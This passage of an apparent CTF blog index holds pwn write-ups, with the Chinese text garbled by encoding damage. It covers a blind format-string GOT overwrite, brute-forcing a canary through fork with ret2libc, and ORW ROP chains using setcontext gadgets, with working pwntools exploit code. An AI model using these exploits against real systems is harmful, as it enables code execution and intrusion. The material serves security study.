¼å¼åŒ–å­—ç¬¦ä¸²æ‰“å°ï¼Œä¼šæ‰“å°åˆ°å­—ç¬¦ä¸²ç»“å°¾\"\\x00\"ï¼Œä½†æ˜¯ä¸ä¼šæ‰“å°å‡º\"\\x00\"ï¼Œæ‰€ä»¥éœ€è¦è¡¥ä¸Š\"\\x00\"ã€‚\n\n(2)è¿™é‡Œçš„%9$s.AAAä¸­åç§»ä¸º9ï¼Œæ˜¯å› ä¸ºæ‰“å°çš„æ˜¯p32(start_addr)å¤„çš„å†…å®¹ï¼Œå‰é¢æœ‰%9$s.AAAå…±å…«ä¸ªå­—èŠ‚ï¼Œä¸¤ä¸ªåœ°å€å•ä½ï¼Œæ‰€ä»¥åç§»7+2=9ã€‚å¹¶ä¸”å¡«å……AAAä¹Ÿæ˜¯ä¸ºäº†æ»¡è¶³åœ°å€å¯¹é½ï¼ŒåŒæ—¶ä½œä¸ºç‰¹å¾ç‚¹æ¥è·å–ç¨‹åºä¼ å›æ¥çš„æ•°æ®ã€‚å°†åœ°å€æ”¾åœ¨åé¢ä¹Ÿæ˜¯ä¸ºäº†é˜²æ­¢åœ°å€ä¸­çš„\"\\x00\"é€ æˆæˆªæ–­ã€‚\n\n(3)dumpçš„å†…å®¹åªéœ€è¦æœ‰0x1000è¿™ä¹ˆå¤§å°±è¡Œï¼Œä¸€ä¸ªå†…å­˜é¡µå³å¯ã€‚\n\n(4)æ²¡æœ‰å¼€å¯PIEæ—¶ï¼Œ32ä½ç¨‹åºä»0x8048000å¼€å§‹ã€‚\n\nâ–²æ­å»ºé¢˜ç›®æ—¶ï¼Œdumpå‡ºæ¥çš„å†…å®¹å¯èƒ½ä¼šæœ‰ç‚¹æ”¹å˜ï¼Œæ²¡åŠæ³•gdbè°ƒè¯•ï¼Œåº”è¯¥æ˜¯libcç‰ˆæœ¬æˆ–è€…ASLRçš„é—®é¢˜ï¼Œä¸è¿‡ä¸å½±å“ï¼ŒIDAé™æ€åˆ†æå°±å¥½ã€‚\n\n5.ä¹‹åå°±æ˜¯å¸¸è§„çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨äº†ï¼Œå€ŸåŠ©dumpä¸‹æ¥çš„æ–‡ä»¶ï¼Œæ‰¾åˆ°printfçš„gotè¡¨åœ°å€ï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ‰“å°printfå‡½æ•°çœŸå®åœ°å€ã€‚ä¹‹åé€šè¿‡DynELFæˆ–è€…LibcSearchæ¥è·å–systemå‡½æ•°åœ¨libcä¸­çš„åç§»ï¼Œåˆ©ç”¨æ³„éœ²çš„printfå‡½æ•°çœŸå®åœ°å€ï¼Œå¾—åˆ°LibcåŠ è½½çš„åŸºåœ°å€ï¼Œå†è®¡ç®—å¾—åˆ°systemå‡½æ•°çš„çœŸå®åœ°å€ã€‚æœ€åå†åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°†systemå‡½æ•°çœŸå®åœ°å€å†™åˆ°printfçš„gotè¡¨å¤„ï¼ŒåŠ«æŒgotè¡¨ã€‚æœ€åå†è¾“å…¥binshå­—ç¬¦ä¸²å³å¯åŠ«æŒprintf(\"/bin/sh\")ä¸ºsystem(\"/bin/sh\")ã€‚\n\n(1)æ³„éœ²printfå‡½æ•°çœŸå®åœ°å€:\n\n```\n#æ³¨é‡Šå¤´\n\ndef get_printf_addr():\n    io = remote('127.0.0.1', '10001')\n    io.recvline()\n    payload = \"%9$s.AAA\" + p32(printf_got)\n    io.sendline(payload)\n    data = p.recvuntil(\".AAA\")[:4]\n    log.info(\"printf address: %s\" % data.encode('hex'))\n    return data\nprintf_addr = get_printf_addr()\n```\n\n(2)è®¡ç®—æˆ–è€…DynELFå¾—åˆ°systemå‡½æ•°çœŸå®åœ°å€system_addrã€‚\n\n(3)åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¿›è¡Œattack\n\n```\npayload = fmtstr_payload(7, {printf_got:system_addr})\nio = remote('127.0.0.1', '10001')\nio.recvline()\nio.sendline(payload)\nio.recv()\nio.sendline('/bin/sh')\nio.interactive()\n```\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://www.dazhuanlan.com/2019/10/08/5d9c20226a067/\n\n \n","tags":["Blind"],"categories":["PWN","BlindFmstr"]},{"title":"NSCTF 2017-pwn2","url":"/2021/08/19/NSCTF 2017-pwn2/","content":"\n1.å¸¸è§„checksecï¼Œå¼€å¯äº†NXå’Œcanaryï¼ŒIDAæ‰“å¼€æ‰¾æ¼æ´ï¼Œsub_80487FA()å‡½æ•°ä¸­å­˜åœ¨ä¸¤ä¸ªæ¼æ´ï¼š\n\n(1)æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ns = (char *)malloc(0x40u);\nsub_804876D(&buf);\nsprintf(s, \"[*] Welcome to the game %s\", &buf);\nprintf(s)\n```\n\n(2)æ ˆæº¢å‡ºæ¼æ´ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nread(0, &buf, 0x100u);\n```\n\n2.ç”±äºcanaryçš„å…³ç³»ï¼Œæ ˆæº¢å‡ºæ²¡åŠæ³•åˆ©ç”¨ï¼Œä½†æ˜¯è¿™é‡Œå¯ä»¥é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ç›´æ¥æ³„éœ²canaryï¼Œä¹‹åå†å®é™…æ“ä½œã€‚è¿™é‡Œä¸ºäº†å­¦ä¹ çˆ†ç ´canaryçš„æ–¹å¼ï¼Œå…ˆç”¨çˆ†ç ´çš„æ–¹å¼æ¥è·å–canaryã€‚\n\n3.å¦‚æœç›´æ¥çˆ†ç ´canaryï¼Œç”±äºcanaryéšæœºåˆ·æ–°ï¼Œå°±ç®—å»æ‰æœ€åä¸€ä¸ªå­—èŠ‚\\x00ï¼Œåœ¨32ä½æ¡ä»¶ä¸‹æˆ‘ä»¬å‡å®šä¸€ä¸ªcanaryçš„å€¼ï¼Œé‚£ä¹ˆcanaryéšæœºç”Ÿæˆä¸ºæˆ‘ä»¬å‡å®šçš„å€¼çš„æ¦‚ç‡åº”è¯¥ä¸º1/(2^24-1)æ‰€ä»¥ä»æ¦‚ç‡ä¸Šè®²åº”è¯¥éœ€è¦çˆ†ç ´2^24-1æ¬¡ï¼Œä¹Ÿå°±æ˜¯16,777,215-1æ¬¡ï¼Œè€Œä¸”è¿˜åªæ˜¯æ¦‚ç‡ä¸Šçš„æœŸæœ›å€¼ï¼Œå¦‚æœä¸è€ƒè™‘canaryçš„å®é™…ç”Ÿæˆæœºåˆ¶ï¼Œå¹¶ä¸”è¿æ°”ä¸å¥½çš„è¯ï¼Œå¯èƒ½æ— ç©·å¤§ï¼Œç­‰çˆ†å‡ºæ¥é»„èŠ±èœéƒ½å‡‰äº†ï¼Œè¿™é¬¼èƒ½æ¥å—ã€‚æ‰€ä»¥ä¸€èˆ¬ä½¿ç”¨çˆ†ç ´canaryéƒ½éœ€è¦ä¸€ä¸ªforkå­è¿›ç¨‹ã€‚\n\n4.å­è¿›ç¨‹çš„å´©æºƒå¹¶ä¸ä¼šå½±å“åˆ°çˆ¶è¿›ç¨‹ï¼Œå¹¶ä¸”ç”±äºå­è¿›ç¨‹çš„æ•°æ®éƒ½æ˜¯ä»çˆ¶è¿›ç¨‹å¤åˆ¶è¿‡æ¥çš„ï¼Œcanaryä¹Ÿä¸€æ ·ï¼Œåªè¦çˆ¶è¿›ç¨‹ä¸ç»“æŸï¼Œå­è¿›ç¨‹æ— è®ºå´©æºƒå¤šå°‘æ¬¡å…¶åˆå§‹åŒ–çš„æ•°æ®è¿˜æ˜¯çˆ¶è¿›ç¨‹çš„æ•°æ®ï¼Œcanaryå°±ä¸ä¼šå‘ç”Ÿæ”¹å˜ï¼Œè¿™æ ·å°±ä¸ºå¿«é€Ÿçˆ†ç ´canaryåˆ›é€ äº†å‰æã€‚åˆšå¥½è¿™ä¸ªç¨‹åºæœ‰forkä¸€ä¸ªå­è¿›ç¨‹ï¼š\n\n(1)è§‚å¯Ÿæ±‡ç¼–ä»£ç ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191522904.png)\n\nmainå‡½æ•°ä¸»ä½“ä¸­å…ˆcall forkï¼Œç”±äºå‡½æ•°çš„ç»“æœåŸºæœ¬éƒ½æ˜¯ä¼ ç»™eaxï¼Œæ‰€ä»¥è¿™é‡Œçš„eaxå°±ä»£è¡¨forkçš„æˆåŠŸä¸å¦ï¼Œè¿”å›IDä»£è¡¨forkæˆåŠŸï¼Œç„¶åå°†è°ƒç”¨ç»“æœèµ‹å€¼ç»™å±€éƒ¨å˜é‡[esp+1ch]ï¼Œä¹‹åæ‹¿0ä¸å±€éƒ¨å˜é‡[esp+1ch]æ¯”è¾ƒã€‚è¿™é‡Œæ¶‰åŠåˆ°JNZå½±å“çš„æ ‡å¿—ä½ZFï¼ŒCFç­‰ï¼Œä¸ç»†ä»‹ç»ã€‚æ€»è€Œè¨€ä¹‹å°±æ˜¯ä¼šforkä¸€ä¸ªå­è¿›ç¨‹ï¼ŒæˆåŠŸå°±è·³è½¬åˆ°æˆ‘ä»¬ä¹‹å‰è¯´è¿‡çš„æœ‰æ¼æ´çš„å‡½æ•°ä¸­ï¼Œå¤±è´¥åˆ™ç­‰å¾…ï¼Œä¸€ä¼šç„¶åä¾æ®whileé‡å¼€ç¨‹åºã€‚\n\n(2)è§‚å¯Ÿä¼ªä»£ç ä¹Ÿå¯ä»¥\n\nâ–²forkæœºåˆ¶ï¼š\n\n1ï¼‰åœ¨çˆ¶è¿›ç¨‹ä¸­ï¼Œforkè¿”å›æ–°åˆ›å»ºå­è¿›ç¨‹çš„è¿›ç¨‹IDï¼›\n\n2ï¼‰åœ¨å­è¿›ç¨‹ä¸­ï¼Œforkè¿”å›0ï¼›\n\n3ï¼‰å¦‚æœå‡ºç°é”™è¯¯ï¼Œforkè¿”å›ä¸€ä¸ªè´Ÿå€¼ï¼›\n\n5.çˆ†ç ´canaryåŸç†ï¼š\n\n(1)æœ€å¼€å§‹æˆ‘è®¤ä¸ºå°±ç®—canaryä¸å˜ï¼Œé‚£ä¹ˆä»0*24å¼€å§‹å°è¯•ï¼Œä¸€ç›´åˆ°canaryçš„å€¼ï¼Œé‚£ä¹ˆéœ€è¦å°è¯•canaryå€¼è¿™ä¹ˆå¤šæ¬¡ï¼Œæœ€å°‘1æ¬¡ï¼Œæœ€å¤š2^24æ¬¡ï¼Œå°±ç®—å–æœŸæœ›ï¼Œé‚£ä¹Ÿåº”è¯¥æ˜¯(1/2)*(2^24)æ¬¡ã€‚ä¹Ÿæ²¡åŠæ³•æ¥å—å•Šã€‚\n\n(2)ä¹‹åçœ‹äº†canaryçš„æ£€æŸ¥æœºåˆ¶å’Œç”Ÿæˆæœºåˆ¶ï¼šåœ¨sub_80487FAæ±‡ç¼–ä»£ç ä¸­ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191522748.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191522426.png)\n\nç”Ÿæˆçš„æ—¶å€™æ˜¯å°†æ ˆä¸ŠæŒ‡å®šåœ°æ–¹[ebp+var_C]ç»™ä¿®æ”¹æˆcanaryã€‚\n\næ£€æŸ¥çš„æ—¶å€™ï¼Œæ˜¯ä»æ ˆä¸Šå–[ebp+var_C]çš„å€¼ä¼ ç»™eaxå’Œæœ€å¼€å§‹éšæœºç”Ÿæˆçš„canary(large gs:14h)æ¥æ¯”è¾ƒï¼Œæ‰€ä»¥å½“æˆ‘ä»¬ç”¨æ ˆæº¢å‡ºçš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥åªæº¢å‡ºä¸€ä¸ªå­—èŠ‚æ¥ä¿®æ”¹[ebp+var_C]çš„ç¬¬1ä¸ªå­—èŠ‚ï¼Œ(ç¬¬0ä¸ªå­—èŠ‚æ˜¯\\x00)ï¼Œç„¶åå¯åŠ¨æ£€æŸ¥æœºåˆ¶ã€‚ç”±äºåªä¿®æ”¹äº†æ ˆä¸Š[ebp+var_C]çš„ç¬¬1ä¸ªå­—èŠ‚æ•°æ®ï¼Œç¬¬3,2ä¸ªå­—èŠ‚ä»ç„¶è¿˜æ˜¯ä¹‹å‰è¢«ä¿å­˜çš„canaryçš„å€¼ã€‚æ‰€ä»¥æˆ‘ä»¬è·å–ç¬¬1ä¸ªå­—èŠ‚éœ€è¦å°è¯•æœ€å°‘1æ¬¡ï¼Œæœ€å¤š2^8æ¬¡ï¼Œå¹³å‡(1/2)*(2^8)æ¬¡ï¼Œä¹Ÿå°±æ˜¯128æ¬¡ï¼Œå¯ä»¥æ¥å—ã€‚ä¹‹åå°†çˆ†ç ´æˆåŠŸçš„ç¬¬1ä¸ªå­—èŠ‚åŠ åˆ°æ ˆæº¢å‡ºå†…å®¹ä¸­ï¼Œå†æº¢å‡ºä¸€ä¸ªå­—èŠ‚ä¿®æ”¹[ebp+var_C]ä¸Šçš„ç¬¬2ä¸ªå­—èŠ‚ï¼ŒåŒç†ï¼Œå®Œæˆçˆ†ç ´éœ€è¦128æ¬¡ï¼Œæ€»çš„æ¥è¯´å¹³å‡éœ€è¦128*3=384æ¬¡ï¼Œå®Œå…¨å¯ä»¥æ¥å—ã€‚\n\n(3)çˆ†ç ´ä¸€èˆ¬å½¢å¼ç¨‹åºï¼Œä¸¤ä¸ªå¾ªç¯ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfor i in xrange(3):\nfor j in xrange(256):\n```\n\n6.ä¹‹åä¸åŒç¨‹åºä¸å¤ªä¸€æ ·ï¼Œæœ‰çš„ç¨‹åºæ²¡æœ‰å¾ªç¯ï¼Œæ˜¯ç›´æ¥forkä¸€ä¸ªå­è¿›ç¨‹ï¼Œç›‘å¬å…¶å®ƒç«¯å£ï¼Œè¿™æ—¶å€™åªè¦è¿æ¥è¯¥ç«¯å£å°±å¯ä»¥è¿›è¡Œçˆ†ç ´ï¼Œå¤±è´¥äº†å…³é—­ç«¯å£å°±æ˜¯ã€‚\n\næœ‰çš„ç¨‹åºåªæ˜¯åœ¨ç¨‹åºä¸­forkä¸€ä¸ªå­è¿›ç¨‹ï¼Œä½†æ˜¯æœ‰å¾ªç¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦åœ¨å¾ªç¯é‡Œè·‘å‡ºæ¥canaryã€‚ç„¶åç›´æ¥è¿›è¡Œä¸‹ä¸€æ­¥payloadï¼Œä¸ç„¶æ–­å¼€è¿æ¥çš„è¯ï¼Œç¨‹åºåˆé‡æ–°ç”Ÿæˆcanaryï¼Œç­‰äºæ²¡ç”¨ã€‚\n\n7.æ€»ç»“ä¸€ä¸‹ï¼Œç¨‹åºæœ€å¼€å§‹éœ€è¦è¾“å…¥Yï¼Œç„¶åè·³è½¬åˆ°æœ‰æ¼æ´çš„å‡½æ•°sub_80487FAä¸­ï¼Œä¹‹åå¯ä»¥è·å–è¾“å…¥nameï¼Œè¿™é‡Œçš„è¾“å…¥çš„nameåœ¨ä¸‹ä¸€æ¡[*] Welcome to the gameä¹‹åä¼šè¢«æ‰“å°å‡ºæ¥ï¼Œå¹¶ä¸”æ‰“å°çš„æ–¹å¼å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡è°ƒè¯•ï¼Œè¾“å…¥%pæ¥è·å–æ ˆä¸Šçš„æŒ‡å®šçš„libcåœ°å€å†…å®¹ï¼Œæ³„éœ²libcä»è€Œè·å–libcåŸºåœ°å€ã€‚\n\n8.ç”±äºæ¯æ¬¡å­ç¨‹åºå´©æºƒåéƒ½ä¼šä»å¤´å¼€å§‹ï¼Œéƒ½éœ€è¦å†è¾“å…¥Yå’Œnameï¼Œé‚£ä¹ˆç›´æ¥å°†è¯¥æ®µæ³„éœ²ä»£ç æ”¾åœ¨çˆ†ç ´å¾ªç¯ä¸­å³å¯ï¼š\n\n```\ncanary = '\\x00'\nfor i in xrange(3):\n    for j in xrange(256):\n        io.sendline('Y')\n        io.recv()\n        io.sendline('%19$p') #æ³„éœ²æ ˆä¸Šçš„libcåœ°å€\n        io.recvuntil('game ')\n        leak_libc_addr = int(io.recv(10), 16)\n\n        io.recv()\n        payload = 'A'*16 #æ„é€ payloadçˆ†ç ´canary\n        payload += canary\n        payload += chr(j)\n        io.send(payload)\n        io.recv()\n        if (\"\" != io.recv(timeout = 0.1)): \n        #å¦‚æœcanaryçš„å­—èŠ‚ä½çˆ†ç ´æ­£ç¡®ï¼Œåº”è¯¥è¾“å‡ºä¸¤ä¸ª\"[*] Do you love me?\"ï¼Œå› æ­¤é€šè¿‡ç¬¬äºŒä¸ªrecvçš„ç»“æœåˆ¤æ–­æ˜¯å¦æˆåŠŸ\n            canary += chr(j)\n            log.info('At round %d find canary byte %#x' %(i, j))\n            break\n```\n\n \n\n9.çˆ†ç ´ç»“æŸåï¼Œå¾—åˆ°libcåŸºåœ°å€ï¼Œcanaryï¼Œä»¥åŠä¸€ä¸ªå¯ä»¥åˆ©ç”¨çš„æ ˆæº¢å‡ºï¼Œç¨‹åºå¾ªç¯ä»æœ€å¼€å§‹ã€‚é‚£ä¹ˆåˆ©ç”¨æ ˆæº¢å‡ºè¿”å›åˆ°systemå‡½æ•°ï¼Œç”±äº32ä½ç¨‹åºï¼Œæ ˆä¼ å‚ï¼Œé‚£ä¹ˆå¯ä»¥æå‰å¸ƒç½®å¥½æ ˆï¼Œä½¿å¾—systemå‡½æ•°ç›´æ¥ä»æˆ‘ä»¬å¸ƒç½®çš„æ ˆä¸Šè¯»å–binshå­—ç¬¦ä¸²ï¼Œç›´æ¥getshellã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nlog.info('Canary is %#x' %(u32(canary)))\nsystem_addr = leak_libc_addr - 0x2ed3b + 0x3b060\nbinsh_addr = leak_libc_addr - 0x2ed3b + 0x15fa0f\nlog.info('System_address:%#x,binsh_addr:%#x'%(system_addr,binsh_addr))\n\npayload = ''\npayload += 'A'*16\npayload += canary\npayload += 'B'*12\npayload += p32(system_addr)\npayload += 'CCCC'\npayload += p32(binsh_addr)\n\nio.sendline('Y') #[*] Do you love me?\nio.recv()\nio.sendline('1') #[*] Input Your name please: éšä¾¿ä¸€ä¸ªè¾“å…¥\nio.recv()\nio.send(payload) #[*] Input Your Id: æ¼æ´äº§ç”Ÿç‚¹\nio.interactive()\n```\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n","tags":["canary"],"categories":["PWN","canaryç»•è¿‡0x9"]},{"title":"ORWæ±‡æ€»","url":"/2021/08/19/ORWæ±‡æ€»/","content":"\n1.seccompä¿æŠ¤ï¼š\n\n(1)å·¥å…·å®‰è£…ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nsudo apt install gcc ruby-dev\ngem install seccomp-tools\n```\n\n(2)æŸ¥çœ‹ä¿æŠ¤ï¼š\n\nseccomp-tools dump ./pwn\n\n```\n#æ³¨é‡Šå¤´\n\nroot@241adce81c0a:/ctf/CISCN/silverwolf# seccomp-tools dump ./silverwolf\nline CODE JT JF K\n=================================\n0000: 0x20 0x00 0x00 0x00000004 A = arch\n0001: 0x15 0x00 0x07 0xc000003e if (A != ARCH_X86_64) goto 0009\n0002: 0x20 0x00 0x00 0x00000000 A = sys_number\n0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005\n0004: 0x15 0x00 0x04 0xffffffff if (A != 0xffffffff) goto 0009\n0005: 0x15 0x02 0x00 0x00000000 if (A == read) goto 0008\n0006: 0x15 0x01 0x00 0x00000001 if (A == write) goto 0008\n0007: 0x15 0x00 0x01 0x00000002 if (A != open) goto 0009\n0008: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n0009: 0x06 0x00 0x00 0x00000000 return KILL\n```\n\n(3)è§£æï¼š\n\nå¦‚ä¸Šï¼Œå¦‚æœæ¶æ„ä¸ä¸ºARCH_X86_64ï¼Œåˆ™to 0009(kill)ã€‚ç³»ç»Ÿè°ƒç”¨å·Aä¸ºread,writeï¼Œåˆ™to 0008ï¼Œå³ALLOWã€‚åŒç†çœ‹æ‡‚ifè¯­å¥å°±è¡Œï¼Œè¿™é‡Œåªèƒ½ç”¨readå’Œwriteï¼Œç…§ç†è¯´openä¹Ÿå¯ä»¥ï¼Œä½†æ˜¯è¿™é‡Œå¥½åƒä¸å¤ªè¡Œã€‚\n\n2.setcontextä¸åŒç‰ˆæœ¬ï¼š\n\n(1)2.29ä»¥å‰ï¼šåŠ«æŒ free_hook æˆ–è€… malloc_hookå†™å…¥ setcontextå‡½æ•°ä¸­çš„ gadget( setcontext+53)ï¼Œé€šè¿‡ rdiç´¢å¼•ï¼Œæ¥è®¾ç½®ç›¸å…³å¯„å­˜å™¨ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n<setcontext+53>: mov rsp,QWORD PTR [rdi+0xa0]\n<setcontext+60>: mov rbx,QWORD PTR [rdi+0x80]\n<setcontext+67>: mov rbp,QWORD PTR [rdi+0x78]\n<setcontext+71>: mov r12,QWORD PTR [rdi+0x48]\n<setcontext+75>: mov r13,QWORD PTR [rdi+0x50]\n<setcontext+79>: mov r14,QWORD PTR [rdi+0x58]\n<setcontext+83>: mov r15,QWORD PTR [rdi+0x60]\n<setcontext+87>: mov rcx,QWORD PTR [rdi+0xa8]\n<setcontext+94>: push rcx\n<setcontext+95>: mov rsi,QWORD PTR [rdi+0x70]\n<setcontext+99>: mov rdx,QWORD PTR [rdi+0x88]\n<setcontext+106>: mov rcx,QWORD PTR [rdi+0x98]\n<setcontext+113>: mov r8,QWORD PTR [rdi+0x28]\n<setcontext+117>: mov r9,QWORD PTR [rdi+0x30]\n<setcontext+121>: mov rdi,QWORD PTR [rdi+0x68]\n<setcontext+125>: xor eax,eax\n<setcontext+127>: ret\n```\n\nå¹¶æ‰§è¡Œæå‰å¸ƒç½®å¥½çš„ ORW ROP chainsã€‚\n\nâ–³å¦‚æœæ˜¯free_hookåˆ™å°†å¯¹åº”è¦é‡Šæ”¾çš„å †å—çš„å†…å®¹æ”¹ä¸ºORW ROP chainså³å¯ã€‚å¦‚æœæ˜¯malloc_hookï¼Œä¸å¤ªçŸ¥é“ï¼Œåº”è¯¥ä¹Ÿæ˜¯åœ¨å¯¹åº”å †å—æ”¹ORW ROP chainsï¼Œä½†æ˜¯éœ€è¦è¿™ä¸ªå †å—ç¡®å®æ˜¯è¿™ä¸€æ¬¡mallocå‡ºæ¥çš„å †å—å§ã€‚\n\n(2)2.29å setcontextä¸­çš„gadgetå˜æˆäº†ä»¥ rdxç´¢å¼•ï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬æŒ‰ç…§ä¹‹å‰æ€è·¯çš„è¯ï¼Œéœ€è¦é€šè¿‡ ROPæ§åˆ¶ RDXçš„å€¼ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n.text:00000000000580DD mov rsp, [rdx+0A0h]\n.text:00000000000580E4 mov rbx, [rdx+80h]\n.text:00000000000580EB mov rbp, [rdx+78h]\n.text:00000000000580EF mov r12, [rdx+48h]\n.text:00000000000580F3 mov r13, [rdx+50h]\n.text:00000000000580F7 mov r14, [rdx+58h]\n.text:00000000000580FB mov r15, [rdx+60h]\n.text:00000000000580FF test dword ptr fs:48h, 2\n....\n.text:00000000000581C6 mov rcx, [rdx+0A8h]\n.text:00000000000581CD push rcx\n.text:00000000000581CE mov rsi, [rdx+70h]\n.text:00000000000581D2 mov rdi, [rdx+68h]\n.text:00000000000581D6 mov rcx, [rdx+98h]\n.text:00000000000581DD mov r8, [rdx+28h]\n.text:00000000000581E1 mov r9, [rdx+30h]\n.text:00000000000581E5 mov rdx, [rdx+88h]\n.text:00000000000581EC xor eax, eax\n.text:00000000000581EE retn\n```\n\nè¿™é‡Œå¥½åƒèµ‹å€¼çš„ç´¢å¼•å¥½åƒæœ‰ç‚¹å˜åŒ–ï¼Œæ‰€ä»¥å¯èƒ½å®é™…åšé¢˜çš„æ—¶å€™éœ€è¦å˜ä¸€ä¸‹è„šæœ¬ã€‚åŒæ—¶setcontext+53å˜æˆäº†setcontext+61ç„¶åç”±äºrdxçš„gadgetå¯èƒ½ä¸æ˜¯å¤ªå¥½æ‰¾ï¼Œæ‰€ä»¥ä¸€èˆ¬æœ‰ä»¥ä¸‹å‡ ä¸ªå¥½ç”¨çš„gadgetï¼š\n\nâ‘ getkeyserv_handle+576ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nmov rdx, [rdi+8]\nmov [rsp+0C8h+var_C8], rax\ncall qword ptr [rdx+20h]\n```\n\né€šè¿‡rdiæ§åˆ¶rdxï¼ŒåŒæ ·2.29ä»¥åä¸åŒç‰ˆæœ¬éƒ½ä¸å¤ªä¸€æ ·ï¼Œéœ€è¦å†è°ƒè¯•çœ‹çœ‹ï¼Œæ¯”å¦‚2.31é‡Œå°±æ˜¯ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nmov rdx,QWORD PTR [rdi+0x8]\nmov QWORD PTR [rsp],rax\ncall QWORD PTR [rdx+0x20]\n```\n\nâ‘¡svcudp_reply+26:\n\n```\n#æ³¨é‡Šå¤´\n\nmov rbp, qword ptr [rdi + 0x48]; \nmov rax, qword ptr [rbp + 0x18]; \nlea r13, [rbp + 0x10]; \nmov dword ptr [rbp + 0x10], 0; \nmov rdi, r13; \ncall qword ptr [rax + 0x28];\n```\n\né€šè¿‡rdiæ§åˆ¶rbpå®ç°æ ˆè¿ç§»ï¼Œç„¶åå³å¯ä»»æ„gadgetäº†ã€‚\n\nå…¶ä¸­2.31ç‰ˆæœ¬ä¸‹è¿˜æ˜¯ä¸€æ ·çš„ï¼Œå¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nmov rbp,QWORD PTR [rdi+0x48]\nmov rax,QWORD PTR [rbp+0x18]\nlea r13,[rbp+0x10]\nmov DWORD PTR [rbp+0x10],0x0\nmov rdi,r13\ncall QWORD PTR [rax+0x28]\n```\n\nâ‘¢ä¸‡èƒ½gadgetï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆhttps://www.anquanke.com/post/id/236832#h3-10è¿™ç¯‡æ–‡ç« æ²¡æœ‰æåŠåˆ°ä¸‡èƒ½gadgetï¼Œä¸è¿‡æˆ‘è§‰å¾—åº”è¯¥ä¹Ÿèƒ½ç”¨ï¼Œä¸è¿‡ä½¿ç”¨ä¸‡èƒ½gadgetçš„è¯ä¸€èˆ¬è¿˜éœ€è¦é…åˆæ ˆè¿ç§»æ‰è¡Œã€‚\n\nâ‘£é€šè¿‡environæ³„éœ²æ ˆåœ°å€ï¼Œå¹¶åœ¨æ ˆä¸Šæ„é€ orw ropé“¾ã€‚(libcçš„bssåç§»ï¼Œç„¶åio_file)\n\n \n\n3.å¸¸ç”¨orw chainsè„šæœ¬ï¼š\n\n(1)åˆ©ç”¨openã€writeã€readï¼š\n\nCISCN-2021 silverwolf\n\n```\n#æ³¨é‡Šå¤´\n\n#ç›´æ¥æ”¹__free_hookä¸ºsetcontext+53\n#2.28 and down\n\nchunk_addr = heap_addr +0x2e0\nfake_rsp = chunk_addr + 0xb0 + 0x10\nflag = chunk_addr + 0xb0\n\norw = \"a\"*0xa0\n\norw += p64(fake_rsp)+p64(ret)\norw += './flag\\x00\\x00'\norw += p64(0)\norw += p64(pop_rdi_ret) + p64(flag)\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_ret) + p64(0x30)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\n```\n\n2019-BALSN-CTF-plaintext\n\n```\n#æ³¨é‡Šå¤´\n\n#2.29,éœ€è¦å°†__free_hookè®¾ç½®ä¸ºæŒ‡å®šgadgetï¼Œè¿™é‡Œä¸º__libc_cleanup_routine+7\nmov rdx, qword ptr [rdi + 8]\nmov rax, qword ptr [rdi]\nmov rdi, rdx\njmp rax\n#ä¸åŒgadgetè„šæœ¬éœ€è¦å¾®è°ƒï¼Œåªè¦æ»¡è¶³èµ‹å€¼rdiå¹¶ä¸”ä¹‹åè·³è½¬åˆ°setcontextå³å¯\n#éœ€è¦ä»\"a\"*0xa0ä¸­æ‹¿å‡º0x10çš„ç©ºé—´ç”¨æ¥è®¾ç½®setcontext,ç„¶åå°†rdxèµ‹å€¼ä¸ºå¯¹åº”chunkåœ°å€\n\nchunk_addr = heap_addr +0x30a0\nfake_rsp = chunk_addr + 0xb0 + 0x10\nflag = chunk_addr + 0xb0\n\n#è¿™é‡Œsetcontext+0x1dæˆ–53éƒ½å¯ä»¥ï¼Œå…·ä½“è°ƒè¯•åˆ†æ,ä½†æ˜¯61ä¸è¡Œ\n#å³chunk_addr+0x8èµ‹å€¼ä¸ºchunk_addrï¼Œchunk_addrèµ‹å€¼ä¸ºsetcontext+0x1d\norw = p64(libc_addr + libc.symbols['setcontext'] + 0x1d) + p64(chunk_addr) \norw += \"a\"*0x90\n\norw += p64(fake_rsp) + p64(ret)\norw += './flag\\x00\\x00'\norw += p64(0)\norw += p64(pop_rdi_ret) + p64(flag)\norw += p64(pop_rsi_ret) + p64(0)\norw += 